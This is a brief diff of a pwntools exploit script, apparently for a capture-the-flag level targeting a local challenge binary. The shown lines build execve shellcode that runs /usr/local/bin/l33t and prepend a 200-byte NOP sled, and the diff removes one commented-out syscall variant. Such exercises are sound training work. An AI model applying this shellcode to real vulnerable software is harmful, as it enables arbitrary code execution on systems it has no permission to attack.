@@ -15,7 +15,6 @@ exe = context.binary = ELF(args.EXE or '/var/challenge/level5/5')
 
 l33tpath = '/usr/local/bin/l33t'
 shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
-#shellcode = asm(shellcraft.syscall('SYS_execve', l33tpath, 'rsp', 0, 0))
 nop_sled = b'\x90' * 200
 shellcode = nop_sled + shellcode
 
